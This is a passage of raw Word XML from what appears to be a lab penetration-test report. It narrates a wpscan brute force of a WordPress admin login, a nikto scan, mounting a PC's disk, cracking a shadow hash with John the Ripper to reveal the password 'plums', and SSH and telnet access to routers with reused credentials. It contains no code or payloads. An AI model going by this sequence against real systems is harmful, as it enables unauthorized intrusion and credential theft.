        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008D44B2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>discovered through this application.  The server appears to run on Apache version 2.2.22 with an Ubuntu OS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7123E861" w14:textId="2BABE0CC" w:rsidR="00D0387A" w:rsidRPr="00521489" w:rsidRDefault="00027D18" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7EBEFC71" wp14:editId="430B82F6">
            <wp:extent cx="5936615" cy="1655445"/>
            <wp:effectExtent l="0" t="0" r="6985" b="1905"/>
            <wp:docPr id="7043868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1655445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="546EE248" w14:textId="217385A1" w:rsidR="00027D18" w:rsidRPr="00521489" w:rsidRDefault="00027D18" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 11. nikto scan of the webpage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740544FC" w14:textId="696D15A2" w:rsidR="008D44B2" w:rsidRPr="00521489" w:rsidRDefault="008D44B2" w:rsidP="008D44B2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Afterwards, </w:t>
      </w:r>
      <w:r w:rsidR="00646259" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the tester utilize</w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00646259" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a brute force password cracker in wpscan on the login for the wordpress webpage.  This </w:t>
      </w:r>
      <w:r w:rsidR="00F67941" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>results</w:t>
      </w:r>
      <w:r w:rsidR="00646259" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:r w:rsidR="00BD6E46" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">below login being discovered as shown in Figure 12. Figure 13 shows the tester successfully logging into the admin </w:t>
      </w:r>
      <w:r w:rsidR="00BC6C0B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">account with the credentials discovered through this step. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253BF9AB" w14:textId="77777777" w:rsidR="00F67992" w:rsidRPr="00521489" w:rsidRDefault="00F67992" w:rsidP="008D44B2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D363262" w14:textId="54FA609D" w:rsidR="00027D18" w:rsidRPr="00521489" w:rsidRDefault="001B36C7" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E2C5066" wp14:editId="7C2FE894">
            <wp:extent cx="3526155" cy="748030"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="119188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155" cy="748030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4171FD21" w14:textId="7C71ACF8" w:rsidR="001B36C7" w:rsidRPr="00521489" w:rsidRDefault="001B36C7" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 12. wpscan attack result.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09128C9E" w14:textId="40106025" w:rsidR="001B36C7" w:rsidRPr="00521489" w:rsidRDefault="001B36C7" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52816E5A" wp14:editId="59F8FD0A">
            <wp:extent cx="5936615" cy="4835525"/>
            <wp:effectExtent l="0" t="0" r="6985" b="3175"/>
            <wp:docPr id="21452675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4835525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDEDF95" w14:textId="02FAD188" w:rsidR="001B36C7" w:rsidRPr="00521489" w:rsidRDefault="001B36C7" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 13. </w:t>
      </w:r>
      <w:r w:rsidR="00BC6C0B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Successfully logged</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> onto the wordpress webpage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271C1929" w14:textId="32AAAC9D" w:rsidR="00F13864" w:rsidRPr="00521489" w:rsidRDefault="00F13864" w:rsidP="00F13864">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">From the initial scanning process, </w:t>
      </w:r>
      <w:r w:rsidR="00604B9D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">found in Figure 3, there </w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00604B9D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s an external device </w:t>
      </w:r>
      <w:r w:rsidR="00602515" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">aside the router that appeared to be connected to the kali machine.  This device, known from here on as PC1, </w:t>
      </w:r>
      <w:r w:rsidR="00FE761A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00602515" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s broadcast under the IP address 192.160.0.210.  Due to this device being a PC the tester could mount the disk directly on the kali machine and snoop amongst its files.  The result of this mounting process can be seen in Figure 14. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FB2F08" w14:textId="77777777" w:rsidR="00BC6C0B" w:rsidRPr="00521489" w:rsidRDefault="00BC6C0B" w:rsidP="00BC6C0B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E39BD06" w14:textId="2A247982" w:rsidR="004E5365" w:rsidRPr="00521489" w:rsidRDefault="00525934" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2180E0E3" wp14:editId="41886F59">
            <wp:extent cx="5819140" cy="3179445"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="16643239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140" cy="3179445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AFAA87" w14:textId="427F35B6" w:rsidR="00525934" w:rsidRPr="00521489" w:rsidRDefault="00525934" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 14. mounting of pc1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358BE2D9" w14:textId="44886175" w:rsidR="00602515" w:rsidRPr="00521489" w:rsidRDefault="00602515" w:rsidP="00602515">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">With the disk now properly loaded onto the Kali machine, the tester </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>runs</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a shadow </w:t>
      </w:r>
      <w:r w:rsidR="00343201" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>password hash</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to determine if any vulnerable login information would appear on the PC.  From this, the tester </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>finds</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a log in to an xadmin account</w:t>
      </w:r>
      <w:r w:rsidR="00432D07" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and u</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">tilizing the </w:t>
      </w:r>
      <w:r w:rsidR="008B68A5" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">John the Ripper password cracking software on the kali machine </w:t>
      </w:r>
      <w:r w:rsidR="000E4109" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reveals</w:t>
      </w:r>
      <w:r w:rsidR="008B68A5" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the login had the password “plums”, as seen in Figure 16.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1869084A" w14:textId="7DDB15D1" w:rsidR="00525934" w:rsidRPr="00521489" w:rsidRDefault="00525934" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A06D0B5" wp14:editId="232280B7">
            <wp:extent cx="5735955" cy="3872230"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7406065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955" cy="3872230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F2B8D9" w14:textId="4D87D798" w:rsidR="00525934" w:rsidRPr="00521489" w:rsidRDefault="00525934" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 15. Shadowing pc1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52270A2F" w14:textId="5A67C064" w:rsidR="00525934" w:rsidRPr="00521489" w:rsidRDefault="0005739D" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="159584CA" wp14:editId="3181C4CD">
            <wp:extent cx="4703445" cy="1717675"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="10371882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3445" cy="1717675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CADA452" w14:textId="5C0CF328" w:rsidR="0005739D" w:rsidRPr="00521489" w:rsidRDefault="0005739D" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 16. john hashing result revealing ssh admin login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5609C0DE" w14:textId="0A2E7CED" w:rsidR="008B68A5" w:rsidRPr="00521489" w:rsidRDefault="008B68A5" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Attempting to log into the ssh xadmin account assigned to PC1 with the login found above </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful. Below is a screenshot of that successful login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E2C22E" w14:textId="6129ACCB" w:rsidR="0005739D" w:rsidRPr="00521489" w:rsidRDefault="005F1C8C" w:rsidP="001B36C7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42434F01" wp14:editId="698CFF43">
            <wp:extent cx="4371340" cy="3636645"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="323669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1340" cy="3636645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DC434B" w14:textId="1DCB2C7B" w:rsidR="005F1C8C" w:rsidRPr="00521489" w:rsidRDefault="005F1C8C" w:rsidP="005F1C8C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 17. Successful ssh login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770525E9" w14:textId="77777777" w:rsidR="00D72B82" w:rsidRPr="00521489" w:rsidRDefault="00D72B82" w:rsidP="00D72B82">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AFFD217" w14:textId="52E28921" w:rsidR="005E001F" w:rsidRPr="00521489" w:rsidRDefault="005E001F" w:rsidP="005E001F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc183984555"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Router </w:t>
      </w:r>
      <w:r w:rsidR="00E91521" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="27974183" w14:textId="302CB125" w:rsidR="008B68A5" w:rsidRPr="00521489" w:rsidRDefault="00BD01BE" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">IP routing displayed on router 1 there </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>appears</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to be a second router connected directly to it.  As such the tester </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>performs</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a baseline nmap scan on this second router to determine what devices could be connected.  The second router seemingly ha</w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ssh port logged onto the 192.168.0 225 IP address as well as a telnet login routed to 192.168.0.226. Logging in to telnet using the same vyos credentials from part 1 reveal</w:t>
      </w:r>
      <w:r w:rsidR="00490791" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the IP route from this second router as seen in Figure 19.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8E8B70" w14:textId="77777777" w:rsidR="0071410A" w:rsidRPr="00521489" w:rsidRDefault="0071410A" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BBCFB3A" w14:textId="77777777" w:rsidR="0071410A" w:rsidRPr="00521489" w:rsidRDefault="0071410A" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BAF7206" w14:textId="77777777" w:rsidR="0071410A" w:rsidRPr="00521489" w:rsidRDefault="0071410A" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48C7D266" w14:textId="77777777" w:rsidR="0071410A" w:rsidRPr="00521489" w:rsidRDefault="0071410A" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7870153C" w14:textId="77777777" w:rsidR="0071410A" w:rsidRPr="00521489" w:rsidRDefault="0071410A" w:rsidP="008B68A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="510A678B" w14:textId="0F8A3C0C" w:rsidR="005F1C8C" w:rsidRPr="00521489" w:rsidRDefault="004C5C84" w:rsidP="005F1C8C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EF192C4" wp14:editId="62952A72">
            <wp:extent cx="3512185" cy="2098675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2103192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185" cy="2098675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCCC62B" w14:textId="4401770A" w:rsidR="004C5C84" w:rsidRPr="00521489" w:rsidRDefault="004C5C84" w:rsidP="005F1C8C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 18. nmap of 192.168.0.22</w:t>
      </w:r>
      <w:r w:rsidR="00F12E2C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router.</w:t>
      </w:r>
      <w:r w:rsidR="002578A4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA2F7F" w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3569A5DA" wp14:editId="5F9F94F2">
            <wp:extent cx="3837940" cy="4523740"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19787913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7940" cy="4523740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
